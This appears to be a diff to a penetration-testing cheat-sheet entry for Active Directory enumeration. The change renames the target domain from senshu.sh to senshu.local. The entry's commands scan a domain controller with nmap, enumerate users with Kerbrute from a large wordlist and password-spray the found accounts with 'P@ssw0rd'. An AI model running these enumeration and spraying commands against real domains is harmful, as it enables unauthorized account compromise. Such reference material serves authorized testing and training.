@@ -8,14 +8,14 @@ commands:
       nmap -p 88 10.10.10.27
 
       # Kerbrute — enumerate valid domain users from a wordlist
-      kerbrute userenum --dc 10.10.10.27 -d senshu.sh /usr/local/share/SecLists/Usernames/xato-net-10-million-usernames.txt -o users.txt
+      kerbrute userenum --dc 10.10.10.27 -d senshu.local /usr/local/share/SecLists/Usernames/xato-net-10-million-usernames.txt -o users.txt
   - have: Username
     cmd: |
       # Kerbrute — enumerate with a custom user list
-      kerbrute userenum --dc 10.10.10.27 -d senshu.sh custom_users.txt -o valid_users.txt
+      kerbrute userenum --dc 10.10.10.27 -d senshu.local custom_users.txt -o valid_users.txt
 
       # Kerbrute — password spray against validated users
-      kerbrute passwordspray --dc 10.10.10.27 -d senshu.sh valid_users.txt 'P@ssw0rd'
+      kerbrute passwordspray --dc 10.10.10.27 -d senshu.local valid_users.txt 'P@ssw0rd'
 phase:
   - Enumeration
 target_os:
